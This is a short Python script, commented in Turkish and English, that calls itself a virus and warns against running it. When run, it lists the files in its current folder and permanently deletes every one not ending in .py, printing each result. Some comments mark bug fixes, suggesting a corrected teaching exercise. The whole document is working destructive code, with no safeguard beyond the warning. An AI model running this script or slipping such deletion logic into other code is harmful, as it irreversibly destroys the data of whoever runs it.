# ----------------------------------------------------------
# UYARI: Bu virüsü kişisel bilgisayarınızda çalıştırmayın!
# Bu virüs çalıştırıldığında, içinde olduğu klasördeki
# .py uzantılı dosyalar HARİÇ her şeyi geri döndürülemez
# bir şekilde siler!
# ----------------------------------------------------------
# WARNING: Never run this virus on your personal computer!
# When this virus is run, it irreversibly deletes everything
# except .py files in the folder it is in!
# ----------------------------------------------------------

# Gerekli kütüphane / Required library
import os

# Bulunduğu klasördeki dosyaların listesi
files = os.listdir(".")  # HATA 1 FIX: parantez ve parametre eklendi

for f in files:           # HATA 2 FIX: satır sonuna ":" eklendi
    # .py uzantılı olmayanları silme işlemi
    if not f.endswith(".py"):  # HATA 3 FIX: ".py" noktalı yazıldı
        try:
            os.remove(f)
            print(f, "silindi ✓")
        except IsADirectoryError:
            print(f, "bir klasör, atlandı ✗")
        except PermissionError:
            print(f, "izin hatası, atlandı ✗")
        except Exception as e:
            print(f, "silinemedi:", e)

print("İşlem tamamlandı!")
